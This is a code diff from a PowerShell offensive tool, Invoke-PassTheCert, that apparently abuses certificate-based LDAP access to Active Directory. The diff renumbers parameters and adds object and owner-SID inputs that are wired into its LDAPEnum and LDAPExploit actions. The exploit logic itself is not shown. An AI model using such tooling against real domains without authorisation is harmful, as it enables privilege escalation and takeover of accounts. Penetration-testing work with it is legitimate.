+        [Parameter(Position=16, Mandatory=$false, HelpMessage="Enter the attribute to be processed")]
         [System.String]$Attribute,
 
-        [Parameter(Position=18, Mandatory=$false, HelpMessage="Enter the value to be processed")]
+        [Parameter(Position=17, Mandatory=$false, HelpMessage="Enter the value to be processed")]
         [System.String]$Value,
 
-        [Parameter(Position=19, Mandatory=$false, HelpMessage="Enter the identity of the group to be processed")]
+        [Parameter(Position=18, Mandatory=$false, HelpMessage="Enter the identity of the group to be processed")]
         [System.String]$GroupDN,
 
-        [Parameter(Position=20, Mandatory=$false, HelpMessage="Enter the Qualifier of the ACE to search (i.e. 'AccessAllowed', 'AccessDenied', 'SystemAudit', or 'SystemAlarm')")]
+        [Parameter(Position=19, Mandatory=$false, HelpMessage="Enter the Qualifier of the ACE to search (i.e. 'AccessAllowed', 'AccessDenied', 'SystemAudit', or 'SystemAlarm')")]
         [ValidateSet('AccessAllowed', 'AccessDenied', 'SystemAudit', 'SystemAlarm')]
         [System.String]$AceQualifier,
 
-        [Parameter(Position=21, Mandatory=$false, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
+        [Parameter(Position=20, Mandatory=$false, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
         [System.String]$AccessMaskNames,
 
-        [Parameter(Position=22, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
+        [Parameter(Position=21, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
         [PSDefaultValue(Help="Defaults to empty string to handle ACEs without ObjectAceType (i.e. with access mask(s) only, such as 'GenericAll')")]
         [System.String]$AccessRightName = '',
 
-        [Parameter(Position=23, Mandatory=$false, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to create (... ¿ do you really need to specify it, as you may conveniently use -AccessRightName instead ? ...)")]
+        [Parameter(Position=22, Mandatory=$false, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to create (... ¿ do you really need to specify it, as you may conveniently use -AccessRightName instead ? ...)")]
         [System.String]$AccessRightGUID = '',
 
-        [Parameter(Position=25, Mandatory=$false, HelpMessage="Whenever Set, shows the Detailed Get-Help for the specified action")]
+        [Parameter(Position=23, Mandatory=$false, HelpMessage="Whenever Set, shows the Detailed Get-Help for the specified action")]
         [Alias('h')]
         [Alias('hd')]
         [switch]$HelpDetailed,
 
-        [Parameter(Position=26, Mandatory=$false, HelpMessage="Whenever Set, shows the Examples Get-Help for the specified action")]
+        [Parameter(Position=24, Mandatory=$false, HelpMessage="Whenever Set, shows the Examples Get-Help for the specified action")]
         [Alias('he')]
         [switch]$HelpExamples,
 
-        [Parameter(Position=27, Mandatory=$false, HelpMessage="Whenever Set, shows the Full Get-Help for the specified action")]
+        [Parameter(Position=25, Mandatory=$false, HelpMessage="Whenever Set, shows the Full Get-Help for the specified action")]
         [Alias('hf')]
         [Alias('hh')]
         [switch]$HelpFull,
 
-        [Parameter(Position=28, Mandatory=$false, HelpMessage="Whenever Set, shows the list of available actions")]
+        [Parameter(Position=26, Mandatory=$false, HelpMessage="Whenever Set, shows the list of available actions")]
         [Alias('a')]
         [switch]$ListActions,
 
-        [Parameter(Position=29, Mandatory=$false, HelpMessage="Enter the path of the certificate to export")]
+        [Parameter(Position=27, Mandatory=$false, HelpMessage="Enter the path of the certificate to export")]
         [System.String]$ExportPath,
 
-        [Parameter(Position=30, Mandatory=$false, HelpMessage="Enter the type of the certificate to export ('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', or 'Authenticode')")]
+        [Parameter(Position=28, Mandatory=$false, HelpMessage="Enter the type of the certificate to export ('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', or 'Authenticode')")]
         [ValidateSet('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode')]
         [PSDefaultValue(Help="Defaults to Pfx")]
         [System.String]$ExportContentType = 'Pfx',
 
-        [Parameter(Position=31, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
+        [Parameter(Position=29, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
         [PSDefaultValue(Help="Defaults to empty password")]
         [System.String]$ExportPassword = '',
 
-        [Parameter(Position=32, Mandatory=$false, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple)")]
+        [Parameter(Position=30, Mandatory=$false, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple)")]
         [System.String]$UACFlags,
 
-        [Parameter(Position=33, Mandatory=$false, HelpMessage="Enter the sAMAccountName")]
+        [Parameter(Position=31, Mandatory=$false, HelpMessage="Enter the sAMAccountName")]
         [System.String]$sAMAccountName,
 
-        [Parameter(Position=34, Mandatory=$false, HelpMessage="Enter the object type")]
+        [Parameter(Position=32, Mandatory=$false, HelpMessage="Enter the object type")]
         [System.String]$ObjectType,
 
-        [Parameter(Position=35, Mandatory=$false, HelpMessage="Enter the Type of the SDDL entry")]
+        [Parameter(Position=33, Mandatory=$false, HelpMessage="Enter the Type of the SDDL entry")]
         [System.String]$SDDLACEType,
 
-        [Parameter(Position=36, Mandatory=$false, HelpMessage="Enter the Right(s) of the SDDL entry")]
+        [Parameter(Position=34, Mandatory=$false, HelpMessage="Enter the Right(s) of the SDDL entry")]
         [System.String]$SDDLACERights,
 
-        [Parameter(Position=37, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the Object")]
-        [System.String]$ObjectDN,
-
-        [Parameter(Position=38, Mandatory=$false, HelpMessage="Enter the identity of the principal")]
+        [Parameter(Position=35, Mandatory=$false, HelpMessage="Enter the identity of the principal")]
         [System.String]$Identity,
 
-        [Parameter(Position=39, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Identity' Parameter (REQUIRED if the '-Identity' parameter is NOT a distinguished name)")]
+        [Parameter(Position=36, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Identity' Parameter (REQUIRED if the '-Identity' parameter is NOT a distinguished name)")]
         [System.String]$IdentityDomain,
 
-        [Parameter(Position=40, Mandatory=$false, HelpMessage="Enter the identity of the targeted object")]
+        [Parameter(Position=37, Mandatory=$false, HelpMessage="Enter the identity of the targeted object")]
         [System.String]$Target,
 
-        [Parameter(Position=41, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Target' Parameter (REQUIRED if the '-Target' parameter is NOT a distinguished name)")]
+        [Parameter(Position=38, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Target' Parameter (REQUIRED if the '-Target' parameter is NOT a distinguished name)")]
         [System.String]$TargetDomain,
+
+        [Parameter(Position=39, Mandatory=$false, HelpMessage="Enter the identity of the object")]
+        [System.String]$Object,
+
+        [Parameter(Position=40, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Object' Parameter (REQUIRED if the '-Object' parameter is NOT a distinguished name)")]
+        [System.String]$ObjectDomain,
         
         [Parameter(Position=1337, Mandatory=$false, HelpMessage="Set to true to hide the banner :(")]
         [PSDefaultValue(Help="Defaults to showing the banner")]
@@ -11225,6 +11403,9 @@ function Invoke-PassTheCert {
 
         [Parameter(Position=3001, Mandatory=$false)]
         [System.String]$SPN,
+
+        [Parameter(Position=3002, Mandatory=$false)]
+        [System.String]$OwnerSID,
 
         # =========================================
         # =====         M4K3 Y0ur 0wN!        =====
@@ -11263,7 +11444,7 @@ function Invoke-PassTheCert {
 
         # Else, Proceed with the action
         else {
-            # Converting the provided Identity/Target parameters into their respective Distinguished Name, if applicable.
+            # Converting the provided Identity/Target/Object parameters into their respective Distinguished Name, if applicable.
             if ($Identity) {
                 if ((_Helper-GetTypeOfIdentityString -IdentityString $Identity) -ne 'distinguishedName') {
                     if (-not $IdentityDomain) { Write-Host "[!] If '-Identity' Is NOT A Distinguished Name, Then '-IdentityDomain' Becomes Mandatory !"; return }
@@ -11275,6 +11456,12 @@ function Invoke-PassTheCert {
                     if (-not $TargetDomain) { Write-Host "[!] If '-Target' Is NOT A Distinguished Name, Then '-TargetDomain' Becomes Mandatory !"; return }
                     $TargetDN = _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString $Target -IdentityDomain $TargetDomain
                 } else { $TargetDN = $Target }
+            }
+            if ($Object) {
+                if ((_Helper-GetTypeOfIdentityString -IdentityString $Object) -ne 'distinguishedName') {
+                    if (-not $ObjectDomain) { Write-Host "[!] If '-Object' Is NOT A Distinguished Name, Then '-ObjectDomain' Becomes Mandatory !"; return }
+                    $ObjectDN = _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString $Object -IdentityDomain $ObjectDomain
+                } else { $ObjectDN = $Object }
             }
         }
 
@@ -11364,7 +11551,7 @@ function Invoke-PassTheCert {
             # =========================================
     
             "LDAPEnum" {
-                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope -Name $Name
+                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope -Name $Name -ObjectDN $ObjectDN
             }
 
 
@@ -11375,7 +11562,7 @@ function Invoke-PassTheCert {
             # =========================================
 
             "LDAPExploit" {
-                _LDAPExploit -LdapConnection $LdapConnection -Exploit $Exploit -IdentityDN $IdentityDN -TargetDN $TargetDN -SPN $SPN
+                _LDAPExploit -LdapConnection $LdapConnection -Exploit $Exploit -IdentityDN $IdentityDN -TargetDN $TargetDN -SPN $SPN -OwnerSID $OwnerSID
             }
 
 
